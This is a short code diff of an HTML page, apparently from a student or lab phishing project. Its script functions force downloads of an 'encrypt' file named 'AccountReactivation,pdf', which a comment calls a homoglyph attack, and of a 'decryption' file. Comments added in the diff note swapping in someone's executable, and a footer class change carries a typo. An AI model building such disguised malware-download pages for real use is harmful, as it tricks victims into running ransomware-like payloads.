@@ -14,7 +14,7 @@
     <script>
       function downloadMaliciousFile() {
         const link = document.createElement("a");
-        link.href = "./enc-files/encrypt";
+        link.href = "./enc-files/encrypt"; // change this to hollie's exec
         link.download = "AccountReactivation,pdf"; // homoglyph attack
         document.body.appendChild(link);
         link.click();
@@ -22,7 +22,7 @@
       }
       function downloadDecryptionFile() {
         const link = document.createElement("a");
-        link.href = "./enc-files/decrypt";
+        link.href = "./enc-files/decrypt"; // change this to hollie's exec
         link.download = "decryption";
         document.body.appendChild(link);
         link.click();
@@ -84,7 +84,7 @@
     </div>
 
     <footer
-      class="d-flex flex-column align-items-center bg-light text-center mt-5"
+      class="d-flex flex-column align-items-cente align-self-center bg-light text-center mt-5"
     >
       <div class="container p-4">
         <div class="d-flex justify-content-center flex-wrap">
